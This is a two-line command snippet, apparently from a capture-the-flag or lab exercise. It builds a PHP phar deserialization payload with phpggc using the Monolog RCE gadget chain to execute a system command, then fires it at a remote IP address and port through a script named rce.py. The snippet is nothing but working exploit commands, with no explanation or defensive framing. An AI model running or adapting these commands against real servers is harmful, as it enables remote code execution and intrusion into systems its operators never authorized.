sudo php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -o exploit.phar --fast-destruct monolog/rce1 system "ls /"
python3 rce.py http://178.62.19.68:32584/ exploit.phar
